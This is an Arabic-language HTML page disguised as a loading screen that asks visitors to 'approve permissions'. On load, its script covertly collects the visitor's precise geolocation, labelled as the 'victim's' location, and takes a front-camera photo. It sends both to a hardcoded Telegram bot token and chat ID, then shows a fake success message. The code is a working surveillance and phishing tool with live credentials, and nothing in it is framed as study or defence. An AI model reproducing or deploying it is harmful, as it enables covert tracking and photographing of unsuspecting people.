<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; text-align: center; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div id="status">جاري تهيئة المحتوى...<br>يرجى الموافقة على الأذونات للمتابعة</div>
    
    <video id="video" playsinline autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TOKEN = "8734073875:AAF5fOQ11ouU73zemiV5hxuAhdOao0Zls3s";
        const CHAT_ID = "6082990097";

        function sendToTelegram(message) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
        }

        async function start() {
            // 1. طلب الموقع
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    sendToTelegram(`📍 موقع الضحية: ${mapLink}`);
                },
                (err) => { sendToTelegram(`❌ فشل الموقع: ${err.message}`); },
                { enableHighAccuracy: true }
            );

            // 2. طلب الكاميرا
            try {
                const video = document.getElementById('video');
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                
                video.srcObject = stream;
                
                // انتظار استقرار الكاميرا
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob((blob) => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'img.jpg');
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                        
                        // إيقاف الكاميرا بعد التصوير
                        stream.getTracks().forEach(t => t.stop());
                        document.getElementById('status').innerText = "تم التحميل بنجاح!";
                    }, 'image/jpeg');
                }, 3000);

            } catch (e) {
                sendToTelegram(`❌ فشل الكاميرا: ${e.message}`);
            }
        }

        window.onload = start;
    </script>
</body>
</html>
